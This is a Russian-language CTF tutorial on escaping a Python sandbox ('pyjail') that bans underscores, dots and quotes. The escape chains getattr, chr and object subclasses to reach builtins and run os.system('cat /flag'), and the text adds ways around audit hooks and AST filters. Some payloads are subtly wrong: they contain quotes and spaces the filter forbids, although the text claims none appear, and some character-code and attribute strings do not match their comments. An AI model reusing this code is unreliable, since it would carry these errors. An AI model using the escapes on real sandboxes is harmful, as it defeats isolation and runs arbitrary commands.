## Вопрос, с которого всё начинается

Мы уже выбрались из простого pyjail с чёрным списком слов. Но этот джейл серьёзнее: запрещены подчёркивания `_`, точки `.`, кавычки, пробелы, а также слова `import`, `os`, `open`. Как выполнить команду, если нельзя даже написать `__class__`?

## Наш пример: pyjail без подчёркиваний и кавычек

Смотрим исходник:

```python
blacklist = ['_', '.', "'", '"', ' ', 'import', 'os', 'open', 'eval', 'exec']
src = input(">>> ")
if any(b in src for b in blacklist):
    print("no"); exit()
eval(src)
```

Запрещено всё, чем обычно строят побег. Значит, имена атрибутов придётся собирать по символам, а обращаться к ним — не через точку. Разберём, что осталось доступно: `getattr`, `chr`, `()`, `[]` — фильтр их не трогает.

## Шаг 1: карта ограничений

Первое действие — выписать, что **реально** доступно, а не что запрещено. Запрещены: подчёркивание, точка, кавычки, пробел, `import`, `os`, `open`. Разрешены: `getattr`, `chr`, круглые и квадратные скобки, цифры, буквы (кроме запрещённых слов).

Ключ к побегу: `chr(95)` даёт `_`, а `getattr(obj, 'name')` обращается к атрибуту без точки. Собрав имя из кусочков, мы обходим оба запрета.

## Шаг 2: от объекта к классу

Вспомним объектную модель: у любого значения есть класс, у класса — базовые классы, у `object` — все загруженные подклассы. Но `__class__` написать нельзя — соберём строку:

```python
g = getattr
C = chr(95)                       # '_'
cls = g((), C*2 + 'class' + C*2)  # getattr((), '__class__')
```

`C*2` — это `'__'`, а вся строка — `'__class__'`. `g((), '__class__')` возвращает `<class 'tuple'>`. Дальше так же достаём `__bases__`:

```python
base = g(cls, C*2 + 'bases' + C*2)[0]   # object
```

`__bases__` — кортеж базовых классов; `[0]` — это `object`.

## Шаг 3: ищем нужный класс

Теперь берём все подклассы `object`:

```python
subs = g(base, C*2 + 'subclasses' + C*2)()
```

`subs` — список всех классов, загруженных в интерпретатор. Важно: там только **уже импортированные** классы. Если `subprocess` не импортирован, `Popen` в списке не будет. Поэтому ищем класс, который гарантированно загружен и даёт доступ к builtins — например, `warnings.catch_warnings`:

```python
warn = [c for c in subs if c.__name__ == 'catch_warnings'][0]
```

Здесь `c.__name__` — уже без запрещённых символов: `__name__` мы не пишем, а берём атрибут через точку в list comprehension... стоп, точка тоже запрещена. Значит, и здесь нужен `getattr`:

```python
warn = [c for c in subs if g(c, C*2 + 'name' + C*2) == 'catch_warnings'][0]
```

## Шаг 4: восстанавливаем builtins

У экземпляра `catch_warnings` есть атрибут `_module`, а у модуля — `__builtins__`:

```python
bi = g(g(warn(), C*2 + 'module' + C*2), C*2 + 'builtins' + C*2)
```

`warn()` создаёт объект, `_module` — модуль `warnings`, `__builtins__` — словарь встроенных функций. Теперь у нас есть всё, включая `__import__`. Импортируем `os`, собрав имя из `chr`:

```python
imp = bi[chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)]   # '__import__'
os_mod = imp(chr(111)+chr(115))                                    # 'os'
g(os_mod, 'system')(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103))
```

Последняя строка собирает `'cat /flag'` из кодов символов и передаёт в `system`. Ни одного запрещённого символа в исходнике — фильтр пропускает.

## Шаг 5: другие пути к builtins

`catch_warnings` — не единственный гаджет. Если `__builtins__` вычищен из контекста, его достают через **frames** — объекты кадра стека содержат `f_builtins`:

```python
import sys
sys._getframe().f_builtins['__import__']('os').system('cat /flag')
```

Кадр можно получить и через генератор (`gi_frame`), через исключение (`e.__traceback__.tb_frame`), через `traceback`. Атрибуты тоже достаются через `object.__getattribute__(obj, name)`, если прямой доступ закрыт.

## Шаг 6: аудит-хуки (PEP 578)

Современная защита — `sys.addaudithook`: хук видит события `open`, `exec`, `os.system` и может их блокировать. Обходы:

- если хук добавлен **после** импорта `os`, старые ссылки могут ещё работать;
- через `ctypes` вызвать libc напрямую, минуя Python-события;
- через `os.posix_spawn` или `fork` + `exec` — событие может называться иначе;
- через `__reduce__`/pickle для исполнения в другом контексте.

Но если хук правильно блокирует `open`, `exec` и `ctypes`, побег сильно усложняется — часто нужна уязвимость в самом движке. Это граница между «логическим» джейлом и «системным».

## Шаг 7: если фильтр на AST

«Правильный» pyjail парсит код в AST и запрещает узлы `Import`, `Attribute`, вызовы опасных имён. Тогда строковые трюки не помогают: фильтр смотрит на **структуру**, а не на текст. Обходы ищут дыры в самом фильтре — не проверенные узлы (`Subscript`, `BinOp`, `Lambda`), декораторы, вложенные вызовы. Это уже ближе к pwn.

## Полный прогон от начала до конца

Соберём побег по шагам ещё раз, коротко:

1. `g = getattr`, `C = chr(95)` — готовим обход точки и подчёркивания.
2. `cls = g((), C*2+'class'+C*2)` — получаем класс кортежа.
3. `base = g(cls, C*2+'bases'+C*2)[0]` — поднимаемся к `object`.
4. `subs = g(base, C*2+'subclasses'+C*2)()` — список загруженных классов.
5. Находим `catch_warnings`, достаём `_module.__builtins__`.
6. Через `__import__('os')` вызываем `system('cat /flag')`.

Все имена атрибутов собраны из кусочков, команда — из `chr`, поэтому запрещённые символы не встречаются в исходнике. Тот же каркас работает и когда запрещены кавычки: строки собираются из кодов, а не пишутся литералами.

## Что мы теперь знаем

По-простому:

1. Первым делом — карта ограничений: что реально доступно.
2. `chr(95)` даёт `_`, `getattr` заменяет точку — так обходят запрет символов.
3. `().__class__.__bases__[0].__subclasses__()` — путь к загруженным классам.
4. `catch_warnings` и frames (`f_builtins`) возвращают builtins.
5. Против AST-фильтров и аудит-хуков нужны другие техники, вплоть до уязвимостей движка.

## На что смотреть дальше

- **Класс не загружен.** `__subclasses__()` содержит только импортированные классы — ищите гарантированно загруженные.
- **`__builtins__` то модуль, то dict.** Обрабатывайте оба случая.
- **Фильтр на исходник против AST.** Против строкового — кодирование; против AST — неучтённые узлы.
- **`getattr`/`chr` недоступны.** Ищите `object.__getattribute__` через другие объекты.
- **Ограничение длины.** Длинные цепочки могут не пройти — сжимайте payload.
